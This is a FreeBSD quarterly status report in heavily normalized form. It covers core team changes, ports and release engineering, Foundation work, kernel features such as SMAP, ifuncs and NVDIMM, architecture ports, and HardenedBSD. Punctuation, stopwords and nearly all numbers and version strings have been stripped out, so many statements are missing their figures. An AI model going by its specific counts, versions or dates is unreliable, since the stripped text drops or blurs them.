last quarterly report sean eric fagan sef commit bit reactivated period rementoring alexander motin mav mips architecture promoted tier status core approved change code conduct fortune data file except freebsdtips removed core approved adoption policy requiring license exception recorded alongside code gordon tetlow gordon became new security officer core approved use spdx tag jeb cramer jeb awarded src commit bit mentorship sean bruno sbruno eric joyner erj member coc review team approved membership reviewed per year vendor commit bit awarded slava shwartsman slavash mellanox technology mentorship konstantin belousov kib han petter selasky hselasky walter schwarzenfeld awarded project membership brad davis brd awarded src commit bit mentorship allan jude allanjude baptiste daroussin bapt comentor vincenzo maffione vmaffione awarded src commit bit mentorship hiroki sato hr ram kishore vegesna ram awarded src commit bit mentorship kenneth merry ken alexander motin mav tom jones thj awarded src commit bit mentorship jonathan looney jtl matt macy mmacy commit bit restored mentorship sean bruno sbruno breno leitao leitao awarded src commit bit mentorship justin hibbits jhibbits nathan whitehorn nwhitehorn comentor leandro lupori luporl awarded src commit bit mentorship justin hibbits jhibbits nathan whitehorn nwhitehorn comentor handover ninth tenth elected core team took place tenth core member allan jude allanjude benedict reuschling bcr brook davis brook hiroki sato hr warner losh imp jeff roberson jeff john baldwin jhb kris moore kmoore sean chittenden seanc joseph mingrone jrm appointed core secretary mentorship retiring core secretary matthew seaman matthew new team liaison decided portmgr sean doceng hiroki secteam brook john clusteradm allan coc warner foundation benedict bugmeister john ci sean david maxwell dwm awarded project membership daichi goto daichi commit bit reactivated period rementoring george nevilleneil gnn vendor commit bit awarded ben widawsky bwidawsk intel mentorship ed maste emaste core decided begin meeting twice per month attempt catch many new agenda item liwen hsu lwhsu awarded src commit bit mentorship mark johnston markj ed maste emaste comentor samy al bahra awarded project membership george nevilleneil gnn approved begin comentoring vincenzo maffione vmaffione contact rené ladan portmgrsecretary freebsdorg first quarter number port grew almost open pr fewer unassigned commits committers compared last quarter number commits grew number pr dropped good number quarter number port grew number open pr grew almost fewer unassigned total committers made almost commits compared first quarter number commits dropped number pr grew last three quarter portmgr took twelve commit bit safekeeping daichi deichen ian junovitch kevlo maho nemysis pawel rea tabthorpe vg wxs portmgr welcomed thirteen new committers devin teske dteske eric turgeon ericbsd fernando apesteguía fernape fukang chen loader gleb popov arrowd jesper schmitz mouridsen jsm john hixson jhixson kevin bowling kbowling koichiro iwao meta mateusz piotrowski matthias fechner mfechner sergey kozlov skozlov following committers returned hiatus ionmihai tetcu itetcu kevin lo kevlo sean chittenden seanc last three quarter antoine brodin antoine ran fewer expruns port tree run executed test update perform cleanup make improvement framework base system run port upgrade others include lld progress change default port version improved support riscv architecture removed old base system functionality new us better matching pkgplist makefile option doc example five new us value introduced apache handle dependency apache web server module eigen automatically depend emacs handle dependency emacs editor module gl replaces old usegl bsdportmk qtdist replace old useqt bsdqtmk extrapatches functionality extended support directory automatically apply patch file port port using usesphp phpize php ext php zend php pecl flavored package automatically built version php supported update major port pkg chromium firefox firefoxesr ruby default version php changed former version php longer supported developer default version samba gcc respectively xorg port reorganized change netopenntpd please review updating file relevant detail open task number commits dropped somewhat last three quarter leaving pr unresolved possible please pick pr improve everyone experience contact freebsd release engineering team freebsdorg freebsd release engineering team responsibility include setting publishing release schedule official project release freebsd announcing code slush freeze thaw maintaining respective branch supported release freebsd release engineering team led marius strobl completed early october freebsd fifth release branch built stability reliability freebsd cycle started april announcement code slush first stage progress continued throughout rest quarter code freeze followed three beta build three rc build final release build announced june freebsd release engineering team started cycle august announcement code slush code freeze followed august tentative date branch expected september due unforeseen circumstance upstream code necessary include tentative release schedule needed adjusted several time api change updated version upstream code required change made base system utility linked upstream code end quarter branch created due delay throughout remainder several development snapshot build released head branch much work sponsored freebsd foundation contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase support hardware improve maintain freebsd infrastructure provides resource improve security quality assurance release engineering effort publishes marketing material promote educate advocate freebsd project facilitates collaboration commercial vendor freebsd developer finally represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight freebsd foundation help freebsd last quarter partnership commercial user support c nonprofit nt directly support commercial user work understand need help facilitate collaboration community last quarter met key freebsd user supporter discus pain point contribute back freebsd technology would like see supported support freebsd technology product many know formed partnership intel around one half year ago since people worked directly left company moved u new relationship open source technology center otc encouraged intel dedicated additional resource otc work freebsd addition existing resource networking group technology quickassist much work focused security o mitigation also focusing area power management persistent memory may july traveled intel hillsboro campus meet management engineer otc networking team presented overview project foundation also discussed key market vendor use freebsd product service future requirement intel also interested learning contributes freebsd along line done work otc create script organizational mapping answer question note need developer help u update maintain organizational mapping understand developer tend move around contractor often working behalf multiple organization fundraising effort work funded donation september raised fundraising goal continuing work hard meet exceed goal please consider making donation help u continue increase support freebsd http wwwfreebsdfoundationorgdonate also new partnership program provide benefit larger commercial donor find information http wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram share company o improvement foundation improves freebsd operating system employing technical staff maintain improve critical kernel subsystem add feature functionality fix problem also includes funding separate project grant like port porting blacklistd access control daemon integration vimage support make sure freebsd remains viable solution research education computing product kicked continued following project last quarter openzfs raidz expansion project headless mode outofthebox embedded arm board like beaglebone black performance scalability improvement software developer staff allowed u jump work directly project improve freebsd zfs improvement new intel server support kqueue update inode support stack guard kernel undefined behavior sanitizer toolchain project driver investigation nvdimm support acpiconf continuous integration dashboard web page physical hardware fat filesystem support makefs continuous integration quality assurance foundation provides fulltime staff member working improving automated testing continuous integration overall quality assurance effort foundation employee liwen hsu set new ci server speed build test job reduce latency change committed result available liwen also set staging development server order test change ci system without affecting production result also started small hardware test lab currently connected staging server test full boot test cycle physical hardware near future additional hardware device added migrate production ci server release engineering foundation provides fulltime staff member lead release engineering effort provided timely reliable release last five year foundation employee glen barber continued leading effort upcoming detail surrounding work involved progress thus far please see freebsd release engineering team section quarterly status report supporting freebsd infrastructure foundation provides hardware support improve freebsd infrastructure last quarter continued supporting freebsd hardware located around world freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting using freebsd contributing project easier attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project check advocacy education work last quarter organized ran essen freebsd hackathon essen germany participated freebsd developer summit bsdcam cambridge england represented freebsd arm partner meeting presented taught freebsd sdnog khartoum sudan exhibited gave talk oscon portland exhibited grace hopper celebration sponsored silver nonprofit sponsor exhibited cocon taipei taiwan sponsored gave presentation tutorial eurobsdcon bucharest romania organized ran bucharest freebsd developer summit sponsored usenix security symposium baltimore md industry partner provided freebsd advocacy material sponsored usenix annual technical conference boston industry partner sponsored openzfs developer summit silver sponsor presented taught freebsd dhaka bangladesh sponsored snia storage developer conference association partner provided travel grant freebsd contributor attend many event continued producing freebsd advocacy material help people promote freebsd around world read conference adventure conference recap trip report monthly newsletter http wwwfreebsdfoundationorgnewsandeventsnewsletter help educate world freebsd publishing professionally produced freebsd journal last quarter published julyaugust issue find http wwwfreebsdfoundationorgjournal find event attended upcoming event http wwwfreebsdfoundationorgnewsandevents legalfreebsd ip foundation owns freebsd trademark responsibility protect also provide legal support core team investigate question arise go http wwwfreebsdfoundationorg find support freebsd help project span multiple category kernel userspace port collection external project contact brook davis brook freebsdorg part maintaining external abi application binary interface compatibility layer improving freebsd infrastructure primarily compatibility layer one freebsd strength easily support many abis includes support aout format executables v standard elf support linux emulation layer etc infrastructure existed decade every design decision stood test time support also incomplete number area eg network management emulation committed improvement include improved ioctl sysctl support allow ifconfig netstat work compat mode migration model translating ioctl command data structure kernel boundary translating command processed correctness improvement ioctl command meaning outside specific file descriptor question improves code reusability outoftree work soon include compatibility layer simplification generic elf process execution path ed maste john baldwin number simplification including minor speedup committed portion work developed sri international university cambridge computer laboratory department computer science technology darpaafrl contract ctsrd part darpa crash research programme darpa contract ecats part darpa ssith research programme work progress includes cleanup apis used kernel creating process continued ioctl improvement work also underway generate system call list default list remaining ioctl command handled need migrated point implementation help latter would appreciated contact konstantin belousov kib freebsdorg freebsd architecture including started suffer rapid growth size software past decade address space enough space given task mode still intrinsic advantage mode due le memory traffic economical use cache grown harder provide selfhosting system build due increase size build tool freebsd kernel prior version split address space platform minus accessible userspace access kernel access neither kernel userspace could access full address space program require large virtual address space clang compiling lld linking could run address space address space insufficient operation kernel also trouble fitting traditional limitation address space modern sizing network buffer zfs kvahungry inkernel subsystem freebsd architecture changed provide dedicated separate address space userspace kernel giving mode full access minus usable address space userspace architecture access amount address space subsystem architecture kernel increase kernel address space enables growth maintainability architecture split userkernel implementation us two page directory entry pdes shared mode one mapping page table another mode switching trampoline required system table required system table must always mapped regardless kernel user mode includes thing gdtidttss entry significant change made locore code page table creation portion code completely rewritten assembly c improving readability maintainability code user address space longer shared kernel copyout function rewritten make transient mapping userspace page duration needed access initial implementation used vmfaultquickholdpages framework later optimized temporarily switching user mode mapping trampoline using handwritten assembler routine perform faster small block copy operation future plan ongoing maintenance include making pmap capable runtime selection pae nonpae page table format supporting nx execute mapping regular kernel project sponsored freebsd foundation contact konstantin belousov kib freebsdorg nvdimm technology provides nonvolatile memory access characteristic similar regular dram technology implement normal memory address space host acpi uefi specification define platform independent way detect enumerate presence nvdimms specification allow retrieval data needed allow proper application use nvdimm storage new freebsd driver par acpi nfit table list nvdimms operational characteristic physical address space nvdimm memory accessible driver present address region two device one device allows userspace open devfs node readwrittenmapped application mapping zerocopy second device geom disk make possible use nvdimm backing storage normal freebsd filesystem ufs zfs msdosfs note buffer cachemapping file traditional filesystem created nvdimm cause unneeded doublebuffering empirically typical modern hardware nvdimm region located far regular dram backed memory address space attribute compatible regular dram memory make unfeasible extend kernel direct map provide kernel mapping nvdimm region new pmap kpi designed pmaplargemap allows efficient mapping large physical region kva new code optimization cache flushing operation mapped region needed efficiently support bio flush filesystems using nvdimm storage nvdimm driver first user new kpi new kpi might also useful ntb driver todo intel currently working extending driver support uefi namespaces daxcapable filesystem needed solves issue doublebuffering tmpfs already provides vm facility allows avoid doublebuffering mmap reused project sponsored freebsd foundation contact warner losh imp freebsdorg contact kyle evans kevans freebsdorg contact toomas soome tsoome freebsdorg freebsd boot loader life srcstand prior release sysboot liblibstand cover code project provides interacts hardware kernel start lua interpreter added earlier made default due undiagnosed booting issue lua interpreter disabled powerpc lua interpreter scheduled replace forth interpreter entirely freebsd although forth interpreter remain available build option freebsd plan remove forth loader year release approximately january platform currently working lua interpreter date resolve issue point lua script implement everything forth script ambiguity spec forth script forgiving strictly documented every effort made improve documentation follow old forth behavior document new behavior old behavior clearly bug anticipated change forth loader forth script happen quite mature bullet proof point unlikely undiscovered bug need fixed retirement work progress includes toomas soome port openindiana addition porting enhanced code number way block layer uefi many improvement committed freebsd though remain hopefully entering tree soon freeze lift uefi booting greatly enhanced still machine issue default bootxxxx variable something else environment investigated hope understand problem well enough provide fix freebsd ian lepore reworked geli support architecture independent used architecture support also effort underway support booting signed image improved crypto booting option implement multiboot support contact alex richardson arichardson freebsdorg currently freebsd built freebsd host however free ci tool allow building linux macos therefore used building freebsd base system sometimes useful crossbuild freebsd remote machine emulator even build machine running freebsd goal project allow building freebsd linux macos host future may extended allow compiling window host work originates cheri project motivated multiple case people wanting try cheribsd able compile since freebsd system available compiling completed project also allow developer contribute freebsd even nt access freebsd build system current set patch project found github current prototype possible compile world kernel architecture use clang compiler us gcc however option locale supported yet require change bootstrap tool built linuxmacos change required building nonfreebsd already merged head still rather large number change need review interested getting head would like help please try current prototype report issue arichardson freebsdorg help reviewing change please contact arichardson freebsdorg added pending phabricator review contact edward tomasz napierala trasz freebsdorg many embedded board include hardware support device side usb ability board present another system usb drive network adapter virtual serial port freebsd usb stack supported functionality quite time used fullest extent goal project fix document functionality possibly fix bug make easy use automating much possible starting freebsd functionality enabled box mean connect beaglebone black using usb client socket raspberry pi using onthego otg port laptop get virtual usb serial port serf system console getty waiting log mean longer need look keyboard screen mess console cable configure system also switch provide network interface present usb drive documented freebsd handbook project sponsored freebsd foundation contact michał krawczyk mk semihalfcom ena elastic network adapter smart nic used virtualised environment amazon web service aws support multiple queue handle gb depending instance type used since last report ena version released introduced many bug fix new feature optimization stability error recovery improvement last especially important aws instance reliable may running sensitive function time vm reduced minimum release patch included upgrade hal version improvement reset routine driver triggering reset fault point passing reset reason device perform reset adequately encountered error device statistic like global tx rx counter longer read directly device exception rx drop still read using aenq descriptor rx order completion feature added enabled cleanup rx descriptor order keeping trace free descriptor rx ring monitored prevent ring stalling error handling path reworked fixed driver covered branch prediction statement make cpu feature hot path fix handling df flag ip packet add dynamic logging reduce number message printed driver mtu configuration verified using device capability instead constant value pas packet header length hint device chained mbufs may problematic determine header length header split multiple segment project sponsored amazoncom inc contact freebsd graphic team freebsdorg contact niclas zeising zeising freebsdorg freebsd team responsible lower level freebsd graphic stack includes graphic driver graphic library mesa opengl implementation xorg xserver related library application wayland related library application lot change since last report important one change driver distribution update freebsd later modern graphic driver using linux kpi subsystem found port give much improved support intel amd graphic hardware however currently available legacy driver available freebsd base system also available port tree since cause issue new driver remain tree work ongoing removed except arm easiest way install new driver install graphicsdrmkmod install correct driver depending architecture freebsd version change port well notably changed handling opengl dependency moved us instead handled directly bsdportmk big infrastructure change move individual proto package xorgproto turning build time dependency many thanks portmgr help expruns change update application library needed project management side ongoing work set efficient way working including biweekly conference call discus current work progress note conference call posted mailing list looking forward current major work progress update graphic driver par linux code merged patching bug fixing ongoing also work port vmware guest graphic driver vmwgfx freebsd linux kpi get better graphic support vmware lastly driver side get new graphic driver work well experimental support exists code repository yet merged freebsd port tree userland biggest thing happening update input stack including libinput supporting library work also ongoing updating mesa library project management side important task continue work team work internally also working setting list requirement testing reasonably assured update wo nt cause regression people interested helping find u freebsdorg mailing list gitter chat http gitterimfreebsddesktoplobby also available freebsdxorg efnet also team area github work repository found http githubcomfreebsddesktop contact george nevilleneil gnn freebsdorg contact domagoj stolfa domagojstolfa clcamacuk dtrace wholesystem debugging tool freebsd one actively supported project past year research prototype distributed version dtrace version dtrace trace bhyve virtual machine host freebsd system currently development university cambridge part cadet project recent development include creation dlog inkernel dtrace consumer able publish kafka improvement early boot shutdown tracing virtualisation front improvement made ability dereference follow pointer inside guest host probe context implementing nested page table walk inside dtrace intel architecture cadet project started formalizing dtrace enables automated test generation high assurance dtrace implementation term adherence specification exploration allowable behavior given script currently formal model contains dif instruction code generator providing ability run dif program specified using model using freebsd dtrace implementation result number change upstreamed freebsd auditing subsystem new variable jid jailname added dtrace accessed script opendtrace specification published cover internal working dtrace general adaptation various operating system particular work sponsored afrldarpa cadet project ruslan bukin br added ccompressed isa extension support riscv fbt provider part ecats project mark johnston markj done work fix interaction fbt ifuncs ifuncs toolchain feature allow programmer select function implementation boottime rather compiletime instance memcpy ifunc may implemented either memcpyerms memcpystd fbt created probe implementation function needed extra support ensure fbt memcpy entry continues work expected similar work needed pid provider still pending microsoft showed working demo dtrace ported freebsd added freebsd base dwatch new dtrace tool developed devin teske dteske automating complex query data surgically tapping kernel base profile interpreting domainspecific data another available port making total different pipeline extract data multiple format dwatch also simplifies observation probe point available freebsd making easy find process thread jail triggering probe top dwatch profile leverage higherlevel language python perl sh many contact konstantin belousov kib freebsdorg contact ed maste emaste freebsdorg contact mark johnston markj freebsdorg contact mateusz guzik mjg freebsdorg ifunc special construct elf object allows selection implementation given symbol runtime elf module get final relocation applied selection code use governed small piece user provided code attached symbol called resolver function ifuncs provide convenient way select different machinespecific implementation part code without ugliness unsafety alternative approach runtime patching ifuncs require support static linker ld runtime linker corresponding execution environment freebsd switch ancient licensed bfdbased ld either intree lld external modern bfd ld use ifuncs become possible runtime linkers ifunc support exists following environment kernel usermode dynamic linker static binary startup code use ifuncs previously applied optimization following area kernel context switching code instead huge number runtime check pti v nonpti pcid invpcid instruction supported pcid us set modespecific routine see pmapactivatesw besides removing check runtime also make code much cleanly structured readable tlb cache flush implementation memcpymemmove copyincopyout variant selection erms smap fpu state save restore depending support avx also used userspace currently use ifunc optimization architecture dependent tl base set get function project sponsored freebsd foundation contact ben widawsky bwidawsk freebsdorg new team formed within intel help side channel security mitigation well core enabling evaluating work area except networking team currently focusing two area power management improvement nvdimm namespace support ultimate goal power management work get runtime power management hit opportunistic idle mean device idle o power everything go idle certain socs allow hit low power state across platform freebsd currently nt notion runtime power management many device nt properly implement suspend resume addition preliminary work process thought help eventually enabling opportunistic idle preliminary work happening review nvdimm namespace support also put review acpi spec defines namespaces way partitioning device separate label current work integrate geom used application dependent work review well http team additionally taken smaller task like porting turbostat working git svn init script small modification acpi tooling effort create port pmdk contact mateusz guzik mjg freebsdorg building package machine poudriere exhibit bottleneck see october freebsd foundation newsletter short writeup http one encountered problem stem process handling standard process life cycle unixlike system look like process created fork regular work execve new binary exit becoming zombie parent collect exit code remove zombie variation eg vfork used instead fork type l shell typically vfork new process execve binls guarded several global kernel lock granularity significantly improved different problem stem pipe pipe used time eg du sort n creates pipe whose one endpoint standard output du another standard input sort default pipe hold get filled kernel dedicates part virtual address space hold pipe buffer allocatesdeallocates physical page pipe get createddestroyed induces tlb invalidation request cpu cause unnecessary slowdown easy way cache certain number buffer project sponsored freebsd foundation contact david carlier devnexen gmailcom order increase freebsd tooling uncover code bug userland compilerrt component support static code analysis improvement added since last version starting sanitizers memory sanitizer mainly detect unitialized pointer also simple wx paging request detection available sanitizers also libfuzzer support finally possible allows code tested random value corpus input mutation combination algorithm random input overwritten also used addition ubsan asan msan last xray instrumentation feature also supported mainly performance profiling purpose reasonable performance runtime cost static code analysis department reliable strlcpy unfortunately strlcat get merged due time release wrong usage case covered wx code detection tooling added moment version imported dimitry andric within git branch available freebsd release contact matthew macy mmacy freebsdorg freebsd saw introduction number performance improvement introduction new synchronization primitive epoch replace use reader lock providing existence guarantee data structure epoch used provide reduction overhead pcb lookup high core count system epoch used provide reduction udp send overhead high core count system see link bit detail http system call overhead half freebsd unix socket scale near linearly previously maxed thread numa work lead improvement scalability page fault handling contact elena mihailescu gmailcom contact darius mihai dariusmihaim gmailcom contact sergiu weisz gmailcom contact mihai carabas mihai freebsdorg saverestore feature facility suspend resume guest virtual image added hypervisor bhyve bhyvectl tool used save guest virtual machine three file file guest memory file state device cpu state file metadata used restore process suspend bhyve guest bhyvectl tool must run suspend statefilename option followed guest name restore bhyve guest checkpoint one simply add r option followed main state file file given suspend option bhyvectl starting vm migration feature us saverestore implementation migrate bhyve guest one freebsd host another freebsd host migrate bhyve guest one need start empty guest destination host shared guest image using bhyve tool r option followed source host ip port listen migration request source host migration started executing bhyvectl command migrate option followed destination host ip port send message new feature added create socket connection source destination host migrate guest state via socket separate suspendresumemigration code bhyverunc bhyvectlc added two new file migrationc migrationh added saverestore state xhci added saverestore state fbuf fix vhpet restore state issue timer related add partially support suspending resuming linux guest future task check live migration implemented using freebsd copyonwrite mechanism add live migration support using ept intel add live migration support using npt amd add suspendresume support nvme add suspendresume support virtioconsole add suspendresume support virtioscsi fix restore timer issue fix suspending bhyve thread issue fix suspending bhyve mutexes issue add suspendresume support window guest project sponsored matthew groom ixsystems contact konstantin belousov kib freebsdorg support smap supervisormode access prevention added kernel smap feature make access supervisor mode page accessible user mode cause fault unless eflagsac bit set time access smap implementation us ifunc framework avoid checking smap capability hardware call copyout function architecture freebsd common address space kernel space user space enabling smap virtually split shared address space two disjoint address space different access criterion splitting address space provides relatively lowoverhead way catching direct access kernel usermode using copyout family function copyout family function permitted direct access user space direct access kernel mode user address space nt performed copyout family function indicates potential programming error interesting bug found freebsd kernel smap feature enabled one issue identified existed pci user driver enabling smap feature identified least two port vbox acpicall appeared access userspace unsafe manner project sponsored freebsd foundation contact mateusz guzik mjg freebsdorg function like memset memmove memcpy frequently used virtually program optimized various way freebsd us rudimentary implementation using rep movsqstosq rep prefix high startup latency overly expensive dealing small size short term goal project implement faster variant kernel import libc main speed come using rep small size aligning target buffer byte rep used top runtime detection enhanced rep movsbstosb extention used use rep movsbstosb mid term goal extends userspace simd extension used make function faster ca nt easily used kernel simd register saved transition user kernel performance reason thus use would take care saving register consume advantage using first place concern userspace code bsdlicensed implementation bionic http modification used libc later see intel optimization manual reference http project sponsored freebsd foundation contact konstantin belousov kib freebsdorg modern pci e device typically define memorymapped bar base address register make memory region available device bar separate pagealigned boundary memory region associated enforced need hypervisors provide passthrough using vtd operates memory granularity one page access control also mean bar suitable configuration providing access usermode controlling access normal page table linux already give way userspace mapping bar using sysfs course userspace program enough privilege read bar determine physical address mapping seen cpu use mem aka devmem mmap region memory cumbersome leaf many unresolved issue example bar might activated would require involvement iommu architecture also rude approach make hard create mapping correct caching attribute freebsd pci driver enhanced support mapping pciconf utility extended use new support see pci pciocbarmmap ioctl request description detail pciconf switch todo automatically activate bar mapping done yet problem avoiding resource conflict possible future attachmens kernel driver project sponsored freebsd foundation mellanox technologiesupdating platformspecific feature bringing support new hardware platform contact emmanuel vadot manu freebsdorg spi driver added soc thermal driver addedfixed socs lot bug fixed mmc driver stability better new driver power chip companion soc add overlay use another timer controller default one faulty overlay enabled image default contact marcin wojtas mw semihalfcom contact patryk duda pdk semihalfcom contact rafał kozik rk semihalfcom marvell armada poplular dual core soc thanks multiple low high speed interface platform used wide range product networkattached storage na wifi access point wap others since last report remaining armada support integrated head compile generic config use unmodified sysgnudts device tree detail follows generic config introduce vast rework sysarmmv directory arm platform enable platform support marvell socs boot generic kernel base dynamic detection soc type device tree instead using ifdefs enable flexible environment maintaining marvell platform sysgnudts device tree improve platform code driver eg cesa pcie gpio properly work original linux device tree gpio add multiple fix improvement sysarmmvgpioc rework driver properly integrate head gpio framework main gpioled enable support old linux gpio device tree binding multiple controller used project sponsored stormshield semihalf contact emmanuel vadot manu freebsdorg instead using ubldr version loader us uboot api image use loaderefi primary freebsd loader allow u common boot path arm image contact emmanuel vadot manu freebsdorg dts file device tree source updated par linux release dts compiled board one present uboot always uptodate contact matthew macy mmacy freebsdorg justin hibbits largely stabilized port based talos ii decided procure one slowly working towards taking parity working tree github project part eliminate need continue support year old tree progress far adapted lockdelay use power smt scheduling hint rather using yield hint older isa added ifunc support ported pmap freebsd use new radix tree page table give u superpages mostly free reduced overhead copyinout primitive radix converted copyinout primitive ifuncs switch old new initialization time converted pmap use ifuncs eliminate overhead kobj dispatch hot patch trap handling path needed older hashed page table support work progress nmi semantics nmis need emulated soft disabling interrupt disabling interrupt block interrupt except machine check exception system reset superpage support superpages work functional simulator running currently crash real hardware due incomplete page walk cache tlb invalidation kernel minidump radix mmu enabled minidump support fairly straightforward port time need spent test debug earlyapstartup preliminary patch exist work architecture due ipi setup tied cpu code list item needed achieve kernel feature parity wishful list milestone found http contact patryk duda pdk semihalfcom contact wojciech macek wma freebsdorg contact michal stanek mst semihalfcom contact nathan whitehorn nwhitehorn freebsdorg semihalf happy announce freebsd running ibm project continuation work done nathan whitehorn provided basic support powernv emulator ibm family cpu offer superior performance compared previous power series provides complete numa support core two socket system thread per core io communication handled integrated pcie interface equipped multiple iommu engine support system running freebsd nonvirtualized environment contains generic driver opal hypervisor kboot loader modification allow littleendian loader load bigendian kernel elf skiboot update elfparser allowing understand freebsd kernel file format basic support powernv architecture including mode operation mmu interrupt controller smp operation tested cpu configuration phb subsystem driver including iommu mapping external bus pcie host controller driver xhci driver reworked driver bigendian compatible chelsio cxgbe network adapter nvme ssd drive work merged head included freebsd sponsor ibm freebsd foundation qcm technology semihalf limelight network project kindly initiated supported limelight network kevin bowling contact ruslan bukin br freebsdorg freebsdriscv one actively supported project past year compiler front upstreamed freebsd osdependent bit gnu toolchain updated gcc binutils freebsd package available freebsd testsuite required dependency successfully built riscv test run test failed demonstrates good result initial run reveals area work added support compressed isa extension kdb debugger dtrace fbt provider enabling ccompressed kernel userland default output disassembling instruction kdb looking similar objdump qemu updated latest privilege spec allowing u bring freebsd emulation quite fast take one second boot freebsd singleuser mode qemu http wwwyoutubecomwatch platformlevel interrupt controller plic driver added interrupt support converted intrng plic used qemu virtio network block device change full freebsd distribution booted qemu network virtualization support vimage fixed enabled default order support rocketchip derivative work accessed dirty pte page table entry bit management successfully tested lowrisc board booting multiuser fine lowrisc uart driver added superuserusermodify sum bit status register used kernel access userspace within certain function explicitly handle crossing userkernel boundary contact emmanuel vadot manu freebsdorg produce image image work sopine baseboard contact emmanuel vadot manu freebsdorg contact tom jones thj freebsdorg pocket beagle latest member beagleboard family support added beaglebone image used directly contact emmanuel vadot manu freebsdorg contact uboot mailing list uboot freebsdorg raspberrypi firmware load dtb fat partition based model uboot us dtb pass freebsd loaderkernel instead using dts embedded uboot allow freebsd kernel use raspberrypi foundation provided dtb overlay enable hat overlay obtained installing rpifirmware package new uboot port w variant committed experiment started edward tomasz napierala trasz shown could possibly produce generic image rpi rpib change affecting port collection whether sweeping change touch tree individual port contact adriaan de groot adridg freebsdorg contact tobias c berner tcberner freebsdorg kde freebsd responsible port desktop associated application also manage port well cmake also care freebsd builder kde upstream ci buildkdeorg since last status report lot thing changed first foremost desktop based kde application finally made way official port tree lingering multiple year development repository secondly marked deprecated removed end year following later next year due exponentially increasing burden maintenance technical side bsdqtmk replaced qtmk qtdistmk porter handbook updated thanks tobias kortkamp keeping cmake almost every port control date sddm updated nexttolatest release backported security fix one big issue requires much time keep date underlying chromium need many patch change every release another upcoming issue way freebsd libinput lag behind block future update kde plasma well wayland improvement thankfully looking issue already fixed soon meantime people want give latest kde plasma desktop try use appropriate branch github people willing contribute find u kdefreebsd freenode kde freebsdorg mailing list accept pullrequests contribution githubcomfreebsdfreebsdportskde contact puppet team puppet freebsdorg since last status report last year puppet team regularly updated puppet port catch upstream release also held puppet talk bsdcan recently puppet released bunch new port appeared freebsd port tree obviously main one update puppet language heavily modified consequence upgrading puppet puppet easy task compared experience may encountered previous major version bump still using puppet recommend schedule upgrade soon puppet expected eol end distributing marionette collective module via puppet efficient using package sysutilsmcollective agent client port deprecated marionette collective phased puppetlabs sysutilsmcollective port expected deprecated point future plan keep alternative available alternative called choria active development ripienaar original author marionette collective actively working support freebsd box commit sysutilschoria tree soon considered dropin replacement marionette collective contact oleksandr tymoshenko gonzo freebsdorg scarab cli tool make bugzilla functionality available command line normally user interact bugtracker using web browser certain workflow web ui may obstacle help requiring perform step compared cli tool bugzilla provides xmlrpc interface used automationintegration several cli tool like pybugz used bugsfreebsdorg asis generic onesizefitsall tool mean lot thing cost complex cli scarab created specialized le complex following principle mind auxiliary tool replacement web ui move complexity configuration file keep argument simple possible optimize commontedious task based experience bugzilla following task identified candidate inclusion first release tool downloading attachment host machine copying devbox creating file devbox copying host machine attached web ui creating pr common field value first two operation implemented file fetch fetchall attach command tool third operation implemented introducing pr template set predefined fieldvalue pair combined runtime provide higher flexibility information usage example found config file example noteworthy change documentation tree new external booksdocuments contact wikiadmin freebsdorg freebsd wiki used scratch pad freebsd developer organize project store note publish article added handbook recently however freebsd wiki started attract people wider freebsd community resulted change character wiki result decided discus future tool want use documentation freebsd one discussion held bsdcam may see note general conclusion wiki great tool meant organizing project note community developer move documentation especially handbook wiki quality maintainability would suffer hand current workflow submitting documentation patch involves checking doc tree patching xml file ideal many end user trying approach problem various direction wiki cleaned old content trying define clear hierarchy subpages category make navigating wiki easier article wiki going migrated either doc tree manual page contact edward tomasz napierała trasz freebsdorg contact mateusz piotrowski freebsdorg quarterly report resurrected almost year long hiatus old workflow consisted user submitting xmlformatted entry would get handassembled docbook replaced new one using markdown instead xml submission form replaced github pull request make submission editing much easier userfriendly many project build upon freebsd incorporate component freebsd project project may interest broader freebsd community sometimes include brief update submitted project quarterly report freebsd project make representation accuracy veracity claim submission contact shawn webb shawnwebb hardenedbsdorg last report june lot transpired since status report attempt briefly cover progress made including commits made upstream freebsd jul switched back openssl crypto library provider base lack resource documentation properly supporting libressl base still maintain libressl base however openssl simply default crypto library aka withoutlibressl default look forward building development community around libressl hardenedbsd reenable libressl default providing enhanced security user rejection software monoculture crossdso control flow integrity crossdso cfi exploit mitigation llvm provides forwardedge protection across shared library application boundary hardenedbsd launched noncrossdso cfi support base meaning cfi applied application shared library along safestack provides backwardedge protection crossdso cfi requires aslr wx effectiveness store crucial metadata needing protection hardenedbsd expertly efficiently robustly fulfill requirement pax aslr pax noexec implementation past two year slowly worked crossdso cfi support hardenedbsd made enough progress could publish alpha callfortesting cft need integrate crossdso cfi support rtld function pointer resolved dlopen dlsym work properly cfiicall scheme also need perform experimental package build find breakage fix breakage hope officially debut crossdso cfi latter half possibility pushing back hardenedbsd remains first enterprise operating system use cfi across base set application aug launched new tool called hbsdcontrol toggle exploit mitigation perapplication basis hbsdcontrol us filesystem extended attribute preferred method exploit mitigation toggling filesystem support extended attribute ufs zfs original utility secadm used filesystems support extended attribute nfs september hardenedbsd foundation corp became c taxexempt notforprofit organization usa mean donation u person eligible tax deduction creation hardenedbsd foundation ensure hardenedbsd remains successful longterm look forward working bsd community provide open source cleanroom reimplementation grsecurity patchset based publiclyavailable documentation assisted kyle evans new bectl utility primarily enhancing jail support fixing regression grateful kyle evans assistance landing enhancement upstream freebsd overall responsiveness helpfulness relevant commits bectl taught bhyve live jailed environment allowing user jail hypervisor hardened virtual address space bhyve using guard page work made upstream freebsd grateful freebsd provided insight increase quality efficiency patch news home status home
